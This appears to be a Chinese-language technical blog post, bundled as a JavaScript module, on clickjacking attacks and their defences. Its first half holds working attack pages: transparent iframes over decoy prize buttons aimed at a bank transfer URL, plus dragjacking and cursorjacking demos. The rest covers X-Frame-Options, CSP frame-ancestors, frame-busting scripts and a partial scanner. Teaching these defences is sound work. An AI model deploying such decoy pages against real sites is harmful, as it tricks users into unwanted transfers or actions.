const n=`---
title: "点击劫持(Clickjacking)攻击与防护"
excerpt: "深入探讨点击劫持攻击的原理、类型、危害以及全面的防护策略，帮助开发者构建更安全的Web应用"
coverImage: "/assets/blog/dynamic-routing/cover.jpg"
date: "2025-12-04"
author:
  name: 小羽
  picture: "/assets/blog/authors/jj.jpeg"
ogImage:
  url: "/assets/blog/dynamic-routing/cover.jpg"
---

# 点击劫持(Clickjacking)攻击与防护

## 前言

点击劫持(Clickjacking)是一种视觉欺骗攻击，攻击者通过将目标网站嵌入透明iframe，并覆盖其他内容，诱骗用户点击非预期的位置。这种攻击可以导致用户在不知情的情况下执行敏感操作，如转账、修改密码、下载恶意软件等。本文将深入探讨点击劫持攻击的原理、类型、危害以及全面的防护策略，帮助你构建更安全的Web应用。

## 点击劫持攻击原理

### 基本攻击流程

\`\`\`html
<!-- 1. 攻击者创建恶意页面 -->
<!DOCTYPE html>
<html>
<head>
  <title>有趣的小游戏</title>
  <style>
    /* 隐藏目标网站 */
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0; /* 完全透明 */
      z-index: 2;
      border: none;
    }
    
    /* 诱饵内容 */
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
    
    /* 诱饵按钮 */
    .decoy-button {
      position: absolute;
      top: 200px;
      left: 300px;
      width: 120px;
      height: 40px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- 诱饵内容 -->
  <div class="decoy-content">
    <h1>点击下方按钮赢取大奖！</h1>
    <button class="decoy-button">点击赢奖</button>
  </div>
  
  <!-- 隐藏的目标网站 -->
  <iframe 
    class="hidden-iframe"
    src="https://bank.example.com/transfer?to=attacker&amount=1000">
  </iframe>
</body>
</html>

<!-- 2. 用户看到的是诱饵内容 -->
<!-- 但实际点击的是透明iframe中的转账按钮 -->
\`\`\`

### 高级点击劫持技术

\`\`\`html
<!-- 1. 拖拽劫持(Dragjacking) -->
<!DOCTYPE html>
<html>
<head>
  <title>拖拽游戏</title>
  <style>
    .game-area {
      width: 500px;
      height: 500px;
      border: 2px solid #333;
      position: relative;
      overflow: hidden;
    }
    
    .draggable {
      width: 100px;
      height: 100px;
      background-color: #3498db;
      position: absolute;
      cursor: move;
      z-index: 2;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 1;
      border: none;
      pointer-events: none; /* 禁用iframe交互 */
    }
    
    .drop-zone {
      width: 150px;
      height: 150px;
      background-color: #2ecc71;
      position: absolute;
      bottom: 20px;
      right: 20px;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>将蓝色方块拖到绿色区域</h1>
  
  <div class="game-area">
    <div class="draggable" id="draggable"></div>
    <div class="drop-zone"></div>
    
    <!-- 隐藏的目标网站 -->
    <iframe 
      class="hidden-iframe"
      id="target-iframe"
      src="https://social-media.example.com/share?message=I+love+this+product!">
    </iframe>
  </div>
  
  <script>
    const draggable = document.getElementById('draggable');
    const targetIframe = document.getElementById('target-iframe');
    let isDragging = false;
    let startX, startY;
    
    draggable.addEventListener('mousedown', (e) => {
      isDragging = true;
      startX = e.clientX;
      startY = e.clientY;
      
      // 开始拖拽时启用iframe交互
      targetIframe.style.pointerEvents = 'auto';
    });
    
    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      
      const deltaX = e.clientX - startX;
      const deltaY = e.clientY - startY;
      
      draggable.style.transform = \`translate(\${deltaX}px, \${deltaY}px)\`;
    });
    
    document.addEventListener('mouseup', () => {
      isDragging = false;
      
      // 停止拖拽时禁用iframe交互
      targetIframe.style.pointerEvents = 'none';
    });
  <\/script>
</body>
</html>

<!-- 2. 光标劫持(Cursorjacking) -->
<!DOCTYPE html>
<html>
<head>
  <title>光标劫持示例</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      cursor: none; /* 隐藏真实光标 */
    }
    
    .fake-cursor {
      position: absolute;
      width: 20px;
      height: 20px;
      background-image: url('cursor.png');
      pointer-events: none; /* 不影响鼠标事件 */
      z-index: 1000;
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
    
    .decoy-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
  </style>
</head>
<body>
  <!-- 诱饵内容 -->
  <div class="decoy-content">
    <h1>点击下方按钮获取奖励</h1>
    <button style="position: absolute; top: 200px; left: 300px;">获取奖励</button>
  </div>
  
  <!-- 隐藏的目标网站 -->
  <iframe 
    class="hidden-iframe"
    src="https://example.com/subscribe">
  </iframe>
  
  <!-- 假光标 -->
  <div class="fake-cursor" id="fake-cursor"></div>
  
  <script>
    const fakeCursor = document.getElementById('fake-cursor');
    
    // 跟踪真实鼠标位置
    document.addEventListener('mousemove', (e) => {
      // 偏移假光标位置
      const offsetX = 100; // 水平偏移
      const offsetY = 50;  // 垂直偏移
      
      fakeCursor.style.left = (e.clientX + offsetX) + 'px';
      fakeCursor.style.top = (e.clientY + offsetY) + 'px';
    });
  <\/script>
</body>
</html>
\`\`\`

## 点击劫持攻击类型

### 经典点击劫持

\`\`\`html
<!-- 1. 银行转账点击劫持 -->
<!DOCTYPE html>
<html>
<head>
  <title>免费抽奖活动</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    
    .container {
      width: 100%;
      height: 100vh;
      position: relative;
      overflow: hidden;
    }
    
    .lottery-content {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      padding-top: 50px;
    }
    
    .lottery-title {
      font-size: 2.5em;
      margin-bottom: 20px;
    }
    
    .lottery-description {
      font-size: 1.2em;
      margin-bottom: 30px;
    }
    
    .lottery-button {
      position: absolute;
      top: 300px;
      left: 50%;
      transform: translateX(-50%);
      width: 200px;
      height: 60px;
      background-color: #ff6b6b;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 1.5em;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    
    .hidden-iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.0;
      z-index: 2;
      border: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- 诱饵内容 -->
    <div class="lottery-content">
      <h1 class="lottery-title">🎉 幸运大抽奖 🎉</h1>
      <p class="lottery-description">
        点击下方按钮，有机会赢取iPhone 14 Pro！<br>
        100%中奖，绝不落空！
      </p>
      
      <button class="lottery-button">立即抽奖</button>
    </div>
    
    <!-- 隐藏的银行转账页面 -->
    <iframe 
      class="hidden-iframe"
      src="https://bank.example.com/transfer?to=attacker-account&amount=5000">
    </iframe>
  </div>
</body>
</html>
\`\`\`

## 点击劫持防护策略

### X-Frame-Options响应头

\`\`\`javascript
// 1. 服务器端设置X-Frame-Options
const express = require('express');
const helmet = require('helmet');
const app = express();

// 使用helmet中间件设置安全头
app.use(helmet({
  frameguard: {
    action: 'deny' // 'deny', 'sameorigin', 'allow-from'
  }
}));

// 或者手动设置X-Frame-Options
app.use((req, res, next) => {
  // DENY: 完全禁止页面被嵌入iframe
  res.setHeader('X-Frame-Options', 'DENY');
  
  // SAMEORIGIN: 只允许同源页面嵌入
  // res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  
  next();
});
\`\`\`

### Content Security Policy (CSP) frame-ancestors

\`\`\`javascript
// 1. 服务器端设置CSP frame-ancestors
const express = require('express');
const app = express();

// 使用helmet中间件设置CSP
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      ...helmet.contentSecurityPolicy.getDefaultDirectives(),
      "frame-ancestors": ["'none'"], // 禁止所有iframe嵌入
      
      // 只允许同源嵌入
      // "frame-ancestors": ["'self'"],
      
      // 允许特定域名嵌入
      // "frame-ancestors": ["'self'", "https://trusted-site.com"],
    }
  }
}));
\`\`\`

### JavaScript防御技术

\`\`\`javascript
// 1. 检测iframe嵌入
function checkForIframeEmbedding() {
  try {
    // 检查当前窗口是否是顶层窗口
    if (window.self !== window.top) {
      // 页面被嵌入iframe中
      console.warn('Page is embedded in an iframe');
      
      // 获取父窗口URL
      const parentUrl = document.referrer;
      
      // 检查是否是可信域名
      const trustedDomains = [
        'https://trusted-site.com',
        'https://partner-site.com'
      ];
      
      const isTrustedDomain = trustedDomains.some(domain => 
        parentUrl.startsWith(domain)
      );
      
      if (!isTrustedDomain) {
        // 检测到恶意iframe嵌入
        handleMaliciousIframe();
      }
    }
  } catch (error) {
    // 如果无法访问window.top，可能是跨域iframe
    console.error('Cannot access window.top, possible cross-origin iframe');
    handleMaliciousIframe();
  }
}

// 2. 处理恶意iframe
function handleMaliciousIframe() {
  // 方法1: 重定向到安全页面
  window.top.location = self.location;
  
  // 方法2: 隐藏页面内容
  document.body.innerHTML = \`
    <div style="text-align: center; padding: 50px;">
      <h1>安全警告</h1>
      <p>此页面不允许在iframe中显示。</p>
      <a href="\${window.location.href}" target="_blank">在新窗口中打开</a>
    </div>
  \`;
}
\`\`\`

## 点击劫持检测与监控

### 自动化点击劫持扫描

\`\`\`javascript
// 1. 点击劫持漏洞扫描器
class ClickjackingScanner {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.vulnerabilities = [];
  }
  
  // 执行扫描
  async scan() {
    // 1. 检查X-Frame-Options头
    await this.checkXFrameOptions();
    
    // 2. 检查CSP frame-ancestors
    await this.checkCSPFrameAncestors();
    
    // 3. 测试iframe嵌入
    await this.testIframeEmbedding();
    
    // 4. 生成报告
    return this.generateReport();
  }
  
  // 检查X-Frame-Options头
  async checkXFrameOptions() {
    try {
      const response = await fetch(this.baseUrl);
      const xFrameOptions = response.headers.get('x-frame-options');
      
      if (!xFrameOptions) {
        this.vulnerabilities.push({
          type: 'missing_x_frame_options',
          severity: 'high',
          description: 'Missing X-Frame-Options header',
          recommendation: 'Set X-Frame-Options to DENY or SAMEORIGIN'
        });
      }
    } catch (error) {
      console.error('Error checking X-Frame-Options:', error);
    }
  }
  
  // 生成报告
  generateReport() {
    const highSeverity = this.vulnerabilities.filter(v => v.severity === 'high').length;
    const mediumSeverity = this.vulnerabilities.filter(v => v.severity === 'medium').length;
    const lowSeverity = this.vulnerabilities.filter(v => v.severity === 'low').length;
    
    return {
      summary: {
        total: this.vulnerabilities.length,
        high: highSeverity,
        medium: mediumSeverity,
        low: lowSeverity
      },
      vulnerabilities: this.vulnerabilities,
      recommendations: this.generateRecommendations()
    };
  }
}
\`\`\`

## 实际应用案例

### 银行网站的点击劫持防护

\`\`\`javascript
// 1. 银行网站 - 服务器端防护
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();

// 使用helmet中间件设置安全头
app.use(helmet({
  frameguard: {
    action: 'deny' // 禁止所有iframe嵌入
  },
  contentSecurityPolicy: {
    directives: {
      ...helmet.contentSecurityPolicy.getDefaultDirectives(),
      "frame-ancestors": ["'none'"] // 禁止所有iframe嵌入
    }
  }
}));

// 限制敏感操作频率
const sensitiveOperationLimiter = rateLimit({
  windowMs: 60 * 1000, // 1分钟
  max: 5, // 每分钟最多5次操作
  message: { error: 'Too many requests, please try again later' }
});

// 转账API - 多层防护
app.post('/api/transfer', 
  sensitiveOperationLimiter,
  (req, res) => {
    const { toAccount, amount } = req.body;
    
    // 处理转账逻辑
    // ...
    
    res.json({ success: true, transactionId: 'txn_' + Date.now() });
  }
);
\`\`\`

## 总结

点击劫持是一种隐蔽但危害性极大的Web安全威胁。通过本文的介绍，我们了解了点击劫持的攻击原理、类型、危害以及全面的防护策略。

### 关键防护措施

1. **服务器端防护**：
   - 设置X-Frame-Options响应头
   - 使用CSP frame-ancestors指令
   - 实施多层安全防护

2. **客户端防护**：
   - 检测iframe嵌入
   - 实现JavaScript防御机制
   - 监控可疑活动

3. **安全监控**：
   - 自动化漏洞扫描
   - 攻击模式检测
   - 安全事件记录

### 最佳实践

1. **深度防御**：结合多种防护技术，构建多层次安全体系
2. **最小权限原则**：只允许必要的iframe嵌入
3. **持续监控**：定期扫描和监控，及时发现安全漏洞
4. **安全意识**：提高开发者和用户的安全意识

通过实施这些防护措施，我们可以有效防范点击劫持攻击，保护用户和应用程序的安全。记住，Web安全是一个持续的过程，需要不断学习和更新防护策略。`;export{n as default};
//# sourceMappingURL=24-BNnyNTwp.js.map
